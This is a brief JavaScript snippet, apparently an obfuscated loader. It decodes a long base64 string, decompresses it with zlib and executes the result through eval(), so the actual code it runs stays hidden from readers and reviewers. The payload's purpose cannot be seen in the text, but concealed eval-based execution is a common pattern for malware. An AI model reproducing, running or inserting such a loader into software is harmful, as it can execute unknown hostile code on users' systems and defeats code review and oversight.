
    const zlib = require('zlib');
    const { encodeBase64 } = require('base64-arraybuffer');

    const encodedData = "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";
    const compressedData = Buffer.from(encodedData, 'base64');
    const decompressedCode = zlib.inflateSync(compressedData).toString();

    eval(decompressedCode);
  
